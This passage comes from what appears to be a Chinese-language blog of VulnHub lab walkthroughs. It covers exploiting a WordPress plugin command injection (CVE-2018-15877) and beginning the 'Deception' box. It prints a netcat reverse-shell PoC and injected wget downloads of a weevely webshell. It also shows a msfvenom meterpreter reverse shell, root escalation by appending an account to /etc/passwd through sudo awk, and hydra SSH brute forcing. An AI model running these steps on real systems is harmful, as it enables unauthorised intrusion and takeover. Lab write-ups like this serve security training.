<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg flaghost.png </span><br><span class="line">meta Make           .. text: &quot;passw@45&quot;</span><br></pre></td></tr></table></figure>
<p>得到字符串<code>passw@45</code></p>
<p>这里尝试过用这个字符串作为密码来登入wordpress和ssh服务，但都失败<br />
尝试后发现路径<code>/passw@45/</code><br />
该路径下存在文本<code>flag2.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;</span><br><span class="line">+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;---</span><br><span class="line">----&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>brainfuck编码</p>
<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br />
在这个链接解码后得到账户<br />
<code>web:Hacker@4514</code><br />
这个账户可以用于登入wordpress服务，也可以登入ssh服务</p>
<hr />
<p>这里赘述一下wordpress的渗透思路<br />
登入wordpress之后在Plugins面板看到<code>Plainview Activity Monitor</code></p>
<p>搜索相关漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Plainview Activity Monitor</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                           |  Path</span><br><span class="line">                                                                                         | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>阅读相关文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
<p>这里则需要访问<code>/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</code></p>
<p>个人尝试POC所给出的反弹Shell命令时无效，选择先上传php木马再上传meterpreter后门程序的方法</p>
<p>这里需要注意一点，输入框的相关代码如下<br />
<code>&lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</code><br />
maxlength会限制输入的长度，size会限制显示已输入字符的长度，使用F12适当修改即可</p>
<p>尝试命令注入<br />
<code>a.b|ls</code><br />
回显得到文件列表</p>
<p>本地构建php后门并开启HTTP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass shell.php</span><br><span class="line">python -m SinpleHTTPServer 9900</span><br></pre></td></tr></table></figure>
<p>注入下载命令<br />
<code>a.b|wget http://192.168.31.10:9900/shell.php</code></p>
<p>连接木马<br />
<code>weevely http://192.168.31.36/wordpress/wp-admin/shell.php</code></p>
<p>查看系统版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
<p>构造后门程序<br />
<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf</code></p>
<p>MSF开启监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9933</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>上传后门并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_upload msf.elf &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">.&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure>
<p>MSF接收到shell<br />
之后可能需要靠玩家开脑洞切换到web账户（比如看到passwd文件里存在web账户联想到密码共用）</p>
<h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2>
<p>登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh web@192.168.31.36</span><br><span class="line">Hacker@4514</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for web on jax:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User web may run the following commands on jax:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk</span><br></pre></td></tr></table></figure>
<p>可以以root权限执行awk命令<br />
可以用awk命令修改文件<code>/etc/passwd</code></p>
<p>查看文件<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">user-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bash</span><br><span class="line">web:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p>构造账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1</span><br><span class="line">echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39;</span><br></pre></td></tr></table></figure>
<p>openssl命令需在本地运行</p>
<p>写入账户信息<br />
<code>sudo -u root awk '/web:\/bin\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p>
<p>切换至root</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>localhost</p>
</blockquote>
<p>修改文件<code>/etc/hosts</code>，将<code>127.0.0.1 localhost</code>这一行前面加上’#’，再写入<code>IP localhost</code>。这样就解决了点击链接时总是跳转localhost的问题。本地测试时，Chrome访问localhost还是会有问题，而Firefox可以正常访问。</p>
<blockquote>
<p>awk</p>
</blockquote>
<p>需要通过正则匹配到文件最后的一段字符串，再写入账户信息，否则写入过多数据。</p>
<blockquote>
<p>当你收集到的信息越少的时候，需要继续挖掘的地方就越多</p>
</blockquote>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackchen001/p/7111324.html">awk.write</a></p>
</blockquote>
<hr />
<h1 id="deception"><a class="markdownIt-Anchor" href="#deception"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/haclabs-deception,427/">Deception</a></h1>
<p><code>2020/03/19 19:06:44</code></p>
<h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.207</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)</span><br><span class="line">|   256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)</span><br><span class="line">|_  256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 14.153 days (since Wed Mar  4 23:18:19 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-12"><a class="markdownIt-Anchor" href="#web路径枚举-12"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.207 -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026)                                                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F;                                                                                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F;                                                                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279)                                                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0)                                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22)</span><br></pre></td></tr></table></figure>
<p>wordpres框架内的链接指向的主机为localhost，需要将文件<code>/etc/hosts</code>中的<code>127.0.0.1 localhost</code>这一行注释，再写入<code>192.168.31.207 localhost</code>，使用firefox即可正常访问</p>
<h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2>
<p>访问<code>/wordpress/robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow : &#x2F;robots.html</span><br></pre></td></tr></table></figure>
<p>访问<code>/wordpress/robots.html</code><br />
分析js得知点击&quot;show quest&quot;15次之后会跳转至&quot;admindelete.html&quot;</p>
<p>访问<code>/wordpress/admindelete.html</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOL,A Noob is looking for a hint</span><br></pre></td></tr></table></figure>
<p>访问<code>/wordpress/himt.html</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please collect all the API tokens availabe on the home page</span><br></pre></td></tr></table></figure>
<p>在页面<code>/</code>收集到四段API Token</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API old0 : 5F4DCC3B5AA</span><br><span class="line">API old1 : 765D61D8</span><br><span class="line">API old2 : 327DEB</span><br><span class="line">API new : 882CF99</span><br></pre></td></tr></table></figure>
<p>整理这些API</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat pass </span><br><span class="line"></span><br><span class="line">5F4DCC3B5AA</span><br><span class="line">765D61D8</span><br><span class="line">327DEB</span><br><span class="line">882CF99</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure>
<p>枚举wordpress框架的用户名/插件/主题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] haclabs</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] yash</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>未发现关于插件与主题的有效信息</p>
<p>整理得到用户名字典</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line">yash</span><br><span class="line">haclabs</span><br></pre></td></tr></table></figure>
<p>将其用作口令字典来爆破wordpress登录框，失败</p>
<p>将其用作口令字典来爆破ssh服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.207   login: yash   password: 5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure>
<p>得到ssh服务的账户</p>
<h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2>
<p>登入ssh服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.207</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure>
<p>在目录<code>/home/yash</code>下发现隐藏文件<code>.systemlogs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .systemlogs </span><br><span class="line"></span><br><span class="line">ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389</span><br></pre></td></tr></table></figure>
<p>可以看到有三段内容用引号标识</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;haclabs&quot;</span><br><span class="line">&quot;A&#x3D;123456789&quot;</span><br><span class="line">&quot;+A[::-1]&quot;</span><br></pre></td></tr></table></figure>
<p>尝试后得出账户haclabs的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs987654321</span><br></pre></td></tr></table></figure>
<p>切换至账户haclabs</p>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">haclabs987654321</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (ALL : ALL) 